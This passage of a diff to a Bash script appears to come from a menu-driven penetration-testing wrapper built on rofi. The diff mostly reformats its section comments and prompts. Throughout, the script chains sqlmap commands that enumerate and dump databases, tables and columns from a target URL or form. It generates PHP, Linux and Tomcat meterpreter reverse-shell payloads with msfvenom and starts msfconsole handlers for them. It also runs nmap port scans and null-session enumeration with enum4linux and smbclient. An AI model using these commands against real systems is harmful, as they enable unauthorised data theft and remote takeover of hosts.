-					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | greP -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table	
-
-					");
-
-
+					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database");
+					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | greP -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table");
 					Columns=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" --columns | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2)
-
 					echo "$Columns"
 					sleep 1
-
-					Data=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Columns to Dump
-
-
-					$Columns	
-
-
-					");
-
-
+					Data=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Columns to Dump");
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" -C "$Data" --dump
 
+				##-----------------------------##
+				##     Dump Database In Form   ##
+				##-----------------------------##
 				else
-					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 
-
-					");
-
-					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table	
-
-					");
-
-
+					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database");
+					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table	");
 					Columns=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -T "$Tables" --columns | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2)
-
 					echo "$Columns"
 					sleep 1
-
 					Data=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Columns to Dump:
-
-
 					$Columns	
-
-
 					");
-
-
 					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -T "$Tables" -C "$Data" --dump
 
 				fi
 
-				##Burp Output (NOT WORKING)
+			##-----------------------------##
+			##     SQL Map Burp Output     ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "11" ]]; then
 				file=$(find ./* -name '*.txt' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Choose the file you want to use: This should be file you made from a burp output page")
 				sqlmap --keep-alive --answers="follow=y" --batch -r "$file" — dbs — level 3
 
-				##BACK
+			##-----------------------------##
+			##        SQL Map Back         ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "12" ]]; then
 				break
-				##EXIT
+
+			##-----------------------------##
+			##         SQL Map Exit        ##
+			##-----------------------------##
 			elif [[ $sqlmaps == "13" ]]; then
 				exit
-				fi
-			done
+
+			fi
+		done
 
 
 ##---------------------------------------------------##
 ##                 Reverse Shell                     ##
 ##---------------------------------------------------##
-
-
 	elif [[ $syntax == "7" ]]; then
 		while true; do
 			reverseshell=$(echo -e "1. PHP Reverse Shell\n2. Linux Reverse Shell\n3. Tomcat Reverse Shell\n4. Back\n5. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Reverse Shell would you like to use?" | cut -d '.' -f 1)
-			##PHP Reverse Shell
+			
+			##-----------------------------##
+			##      Reverse Shell PHP      ##
+			##-----------------------------##
 			if [[ $reverseshell == "1" ]]; then
 				msfvenom -p php/meterpreter_reverse_tcp lhost=127.0.0.1 lport=443 -o shell.php
 				sleep 3
 				msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set payload php/meterpreter_reverse_tcp; run; exit -y"
 
-				##Linux Reverse Shell
+			##-----------------------------##
+			##     Reverse Shell Linux     ##
+			##-----------------------------##
 			elif [[ $reverseshell == "2" ]]; then
 				port=$(nmap -sS -p- "$scan" | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d'| rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What Port would you like to use?" | cut -d '.' -f 1)
 				msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=127.0.0.1 lport="$port" -o shell  
 				sleep 3
 				msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"
 
-				##Tomcat Reverse Shell
+			##-----------------------------##
+			##    Reverse Shell Tomcat     ##
+			##-----------------------------##
 			elif [[ $reverseshell == "3" ]]; then
 				port=$(nmap -sS -p- "$scan" | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Port would you like to use?" | cut -d '.' -f 1)
 				msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=127.0.0.1 lport="$port" -f elf -o shell.war 
 				sleep 3
 				msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"
 
-				##Back
+			##-----------------------------##
+			##     Reverse Shell Back      ##
+			##-----------------------------##
 			elif [[ $reverseshell == "4" ]]; then
 				break
 
-				##Exit
+			##-----------------------------##
+			##     Reverse Shell Exit      ##
+			##-----------------------------##
 			elif [[ $reverseshell == "5" ]]; then
 				exit
 
@@ -773,60 +851,86 @@ while true; do
 ##---------------------------------------------------##
 ##                 Null Sessions                     ##
 ##---------------------------------------------------##
-
 	elif [[ "$syntax" == "8" ]]; then
 		while true; do
 			nullsession=$(echo -e "1.  nblookup/netstat\n2.  Password Policy Info\n3.  Enumerate Shares List\n4.  Enumerate Users List\n5.  Do All Above at once\n6.  Brute Forces Users\n7.  Service Available\n8.  Force no Pass\n9.  Exploit Null Sessions\n10. No Pass or User\n11. Not sure yet\n12. Back\n13. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which SQLMap Command would you like to use?" | cut -d '.' -f 1)
 
-				##NbLookup/Netstat
-				if [[ $nullsession == "1" ]]; then
-					enum4linux -n "$scan"
+			##-----------------------------##
+			##    NullSessions Netstat     ##
+			##-----------------------------##
+			if [[ $nullsession == "1" ]]; then
+				enum4linux -n "$scan"
 
-				##Password Policy
+			##-----------------------------##
+			##  NullSessions Pass Policy   ##
+			##-----------------------------##
 			elif [[ $nullsession == "2" ]]; then
 				enum4linux -P "$scan"
 
-				##Enumerate Shares Liss
+			##-------------------------------##
+			## NullSessions Enumerate Shares ##
+			##-------------------------------##
 			elif [[ $nullsession == "3" ]]; then
 				enum4linux -S "$scan"
 
-				##Enumerate Users List
+
+			##-------------------------------##
+			## NullSessions Enumerate Users  ##
+			##-------------------------------##
 			elif [[ $nullsession == "4" ]]; then
 				enum4linux -U "$scan"
 
-				##Do Everything Above at once
+			##-------------------------------##
+			##   NullSessions All At Once    ##
+			##-------------------------------##
 			elif [[ $nullsession == "5" ]]; then
 				enum4linux -a "$scan"
 
-				##Brute Force Users
+			##--------------------------------##
+			## NullSessions Brute Force Users ##
+			##--------------------------------##
 			elif [[ $nullsession == "6" ]]; then
 				enum4linux -s /usr/share/enum4linux/share-list.txt "$scan"
 
-				##Service Available
+			##--------------------------------##
+			## NullSessions Service Available ##
+			##--------------------------------##
 			elif [[ $nullsession == "7" ]]; then
 				smbclient -L //"$scan"
 
-				##Force No Pass
+			##-------------------------------##
+			##   NullSessions Force No Pass  ##
+			##-------------------------------##
 			elif [[ $nullsession == "8" ]]; then
 				smbclient -L //"$scan" -N
 
-				##Exploit Null Session	
+			##-------------------------------##
+			##     NullSessions Exploit      ##
+			##-------------------------------##
 			elif [[ $nullsession == "9" ]]; then
 				smbclient //"$scan"/IPC$ -N
 
-				##No Pass/User
+			##-------------------------------##
+			##   NullSessions No Pass/User   ##
+			##-------------------------------##
 			elif [[ $nullsession == "10" ]]; then
 				smbclient -L WORKGROUP -i "$scan" -N -U ' '
-
-				#Not Sure
+	
+			##-------------------------------##
+			##      NullSessions ***         ##
+			##-------------------------------##
 			elif [[ $nullsession == "11" ]]; then
 				smbclient \\\\\\\\\\\\"$scan"\\\\\\WorkSharing -N
-
-				##BACK	
+	
+			##-------------------------------##
+			##       NullSessions Back       ##
+			##-------------------------------##
 			elif [[ $nullsession == "12" ]]; then
 				break
 
-				##EXIT
+			##-------------------------------##
+			##       NullSessions Exit       ##
+			##-------------------------------##
 			elif [[ $nullsession == "13" ]]; then
 				exit
 
@@ -838,7 +942,6 @@ while true; do
 ##---------------------------------------------------##
 ##                     Exit                          ##
 ##---------------------------------------------------##
-
 	elif [[ "$syntax" == "9" ]]; then
 		exit
 
